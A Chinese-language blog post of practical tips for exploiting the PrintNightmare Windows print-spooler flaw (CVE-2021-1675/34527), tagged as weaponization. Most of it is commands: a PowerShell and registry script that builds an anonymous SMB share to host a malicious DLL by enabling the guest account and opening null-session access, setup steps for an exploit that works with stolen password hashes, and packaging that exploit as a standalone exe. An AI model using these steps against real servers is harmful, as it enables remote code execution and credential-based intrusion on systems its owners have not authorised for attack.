---
title: PrintNightmare 实战利用Tips
date: 2022-11-13 3:34:50
categories: 
- 漏洞
tags:
- 漏洞复现
- PrintNightmare
- CVE-2021-1675
- CVE-2021-34527
- 武器化
---
# **概述**

**CVE-2021-1675 / CVE-2021-34527 这两个洞本质上就是一个洞，只是因为修复的问题分配了两个编号。具体的漏洞分析就不赘述了，很早就有人发过，没必要炒冷饭，这里只总结下实际使用时可能出现的问题，以及很多poc中不会提到的细节**

# 复现

## 环境

注意事项：

1.目标机器为域内Windows Server机器时，攻击机必须为同一域内的机器；目标机器为非域环境Windows Server机器时，攻击机器为目标机器可以访问到的另一机器即可

> 加入域后的Windows系统访问外部资源会携带已登录的域用户凭证，所以未加入域且未提前指定凭据的的SMB就无法访问。因此攻击域内机器有此限制

2.攻击机器为Windows Server 2019及更高版本时，需要执行 `Enable-WindowsOptionalFeature -Online -FeatureName smb1protocol`并重启去开启SMBv1，否则有可能出现rpc_s_access_denied的问题，攻击机器为2016及更低版本的系统时，可以直接使用 `Set-SmbServerConfiguration -EnableSMB1Protocol $true`开启SMBv1的支持

### 步骤

1.在攻击机器创建C:\share文件夹，并将dll放入其中

2.执行

```powershell

#修改路径权限，使所有人可读
icacls C:\share\ /T /grant Anonymous` logon:F
icacls C:\share\ /T /grant Everyone:F
#创建名称为share路径为C:\share的SMB共享
New-SmbShare -Path C:\share -Name share -FullAccess 'ANONYMOUS LOGON','Everyone'
#启用guest用户
net user guest /active:yes
#覆盖已有的NullSessionPipes配置
REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f
#设置可以匿名访问共享
REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionShares /t REG_MULTI_SZ /d share /f
#设置Everyone权限包含匿名登录用户
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f
#设置任何用户都可以通过网络获取本机的信息
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 0 /f
#提取本地安全组策略
secedit /export /cfg gp.inf /quiet
#修改组策略中的指定权限
(Get-Content gp.inf) -replace "SeDenyNetworkLogonRight = Guest","SeDenyNetworkLogonRight = " | Set-Content "gp.inf"
#导入本地安全组策略
secedit /configure /db gp.sdb /cfg gp.inf /quiet
#更新本地安全组策略
CMD.EXE /C "gpupdate/force"
#清理文件
CMD.EXE /C "del gp.inf"
CMD.EXE /C "del gp.sdb"
```

注：此脚本修改自[Invoke-BuildAnonymousSMBServer](https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer)

3.推荐exp为[CVE-2021-1675.py](https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py)，主要优势在于可以使用hash进行攻击，现在越来越难搞到密码了，hash的场景更多

安装：

```cmd
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
pip3 install six pycryptodomex pyasn1
```

之后即可正常使用

如果目标机器不存在python环境，可以打包成exe使用

```cmd
pip3 install pyinstaller
pyinstaller --clean --onefile CVE-2021-1675.py
```
